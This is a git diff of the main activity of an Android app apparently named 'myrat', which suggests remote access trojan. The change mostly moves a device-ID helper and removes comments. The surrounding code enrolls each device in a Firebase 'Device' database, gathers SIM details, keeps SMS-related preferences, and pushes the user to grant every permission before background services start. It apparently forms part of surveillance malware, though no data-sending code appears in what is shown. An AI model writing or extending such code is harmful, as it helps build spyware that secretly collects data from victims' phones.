@@ -19,7 +19,9 @@ import com.google.firebase.ktx.Firebase
 import com.myrat.app.handler.PermissionHandler
 import com.myrat.app.handler.SimDetailsHandler
 import com.myrat.app.service.ServiceManager
+import com.myrat.app.utils.Constants
 import com.myrat.app.utils.Logger
+import com.myrat.app.utils.NotificationHelper
 import pub.devrel.easypermissions.EasyPermissions
 import java.util.UUID
 
@@ -34,6 +36,34 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
     private var permissionsRequested = false
     private var appSettingsVisited = false
 
+    companion object {
+        private const val APP_SETTINGS_REQUEST_CODE = 1001
+        
+        fun getDeviceId(context: Context): String {
+            return try {
+                val prefs = context.getSharedPreferences("SmsAppPrefs", Context.MODE_PRIVATE)
+                var deviceId = prefs.getString("deviceId", null)
+                
+                if (deviceId.isNullOrEmpty()) {
+                    val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
+                    deviceId = if (!androidId.isNullOrEmpty() && androidId != "9774d56d682e549c") {
+                        androidId
+                    } else {
+                        UUID.randomUUID().toString()
+                    }
+                    
+                    prefs.edit().putString("deviceId", deviceId).apply()
+                    Logger.log("Generated new deviceId: $deviceId")
+                }
+                
+                deviceId ?: "fallback_${System.currentTimeMillis()}"
+            } catch (e: Exception) {
+                Logger.error("Error getting device ID", e)
+                "error_${System.currentTimeMillis()}"
+            }
+        }
+    }
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         
@@ -47,14 +77,17 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
             setContentView(R.layout.activity_main)
             Logger.log("MainActivity onCreate - App Settings First, then Rotational Permissions")
             
-            // Initialize deviceId with proper error handling
+            // Create notification channels
+            NotificationHelper.createNotificationChannels(this)
+            
+            // Initialize deviceId
             deviceId = getDeviceId(this)
             if (deviceId.isEmpty()) {
                 Logger.error("Device ID is empty, generating new one")
                 deviceId = generateFallbackDeviceId()
             }
             
-            // Initialize Firebase database reference with error handling
+            // Initialize Firebase database reference
             try {
                 deviceRef = Firebase.database.getReference("Device").child(deviceId)
                 Logger.log("Firebase database reference initialized")
@@ -64,7 +97,7 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
                 return
             }
             
-            // Initialize handlers with error handling
+            // Initialize handlers
             try {
                 simDetailsHandler = SimDetailsHandler(this, deviceId)
                 serviceManager = ServiceManager(this)
@@ -83,11 +116,9 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
             appSettingsVisited = prefs.getBoolean("app_settings_visited", false)
             
             if (!appSettingsVisited) {
-                // First time - go to app settings
                 Logger.log("First launch - opening app settings for manual permission review")
                 openAppSettings()
             } else {
-                // App settings already visited - start permission flow
                 Logger.log("App settings previously visited - starting rotational permission flow")
                 startPermissionFlow()
             }
@@ -96,7 +127,6 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
             Logger.error("Critical error in onCreate", e)
             Toast.makeText(this, "App initialization failed: ${e.message}", Toast.LENGTH_LONG).show()
             
-            // Try to recover by finishing and restarting
             handler.postDelayed({
                 try {
                     finish()
@@ -119,14 +149,12 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
             
             startActivityForResult(intent, APP_SETTINGS_REQUEST_CODE)
             
-            // Show instruction toast
             Toast.makeText(this, 
                 "Please enable ALL permissions in app settings, then return to the app", 
                 Toast.LENGTH_LONG).show()
                 
         } catch (e: Exception) {
             Logger.error("Failed to open app settings", e)
-            // Fallback to permission flow
             startPermissionFlow()
         }
     }
@@ -137,12 +165,10 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
         if (requestCode == APP_SETTINGS_REQUEST_CODE) {
             Logger.log("✅ Returned from app settings - marking as visited")
             
-            // Mark app settings as visited
             val prefs = getSharedPreferences("app_flow", Context.MODE_PRIVATE)
             prefs.edit().putBoolean("app_settings_visited", true).apply()
             appSettingsVisited = true
             
-            // Small delay then start permission flow
             handler.postDelayed({
                 startPermissionFlow()
             }, 1000)
@@ -219,7 +245,6 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
         }
         
         try {
-            // If we haven't visited app settings yet, don't start services
             if (!appSettingsVisited) {
                 Logger.log("App settings not visited yet, waiting...")
                 return
@@ -233,7 +258,6 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
         }
     }
 
-    // EasyPermissions callbacks
     override fun onPermissionsGranted(requestCode: Int, perms: MutableList<String>) {
         permissionHandler?.onPermissionsGranted(requestCode, perms)
     }
@@ -276,33 +300,6 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
             Logger.log("MainActivity destroyed and cleaned up")
         } catch (e: Exception) {
             Logger.error("Error in onDestroy", e)
-        }
-    }
-
-    companion object {
-        private const val APP_SETTINGS_REQUEST_CODE = 1001
-        fun getDeviceId(context: Context): String {
-            return try {
-                val prefs = context.getSharedPreferences("SmsAppPrefs", Context.MODE_PRIVATE)
-                var deviceId = prefs.getString("deviceId", null)
-                
-                if (deviceId.isNullOrEmpty()) {
-                    val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
-                    deviceId = if (!androidId.isNullOrEmpty() && androidId != "9774d56d682e549c") {
-                        androidId
-                    } else {
-                        UUID.randomUUID().toString()
-                    }
-                    
-                    prefs.edit().putString("deviceId", deviceId).apply()
-                    Logger.log("Generated new deviceId: $deviceId")
-                }
-                
-                deviceId ?: "fallback_${System.currentTimeMillis()}"
-            } catch (e: Exception) {
-                Logger.error("Error getting device ID", e)
-                "error_${System.currentTimeMillis()}"
-            }
         }
     }
 }
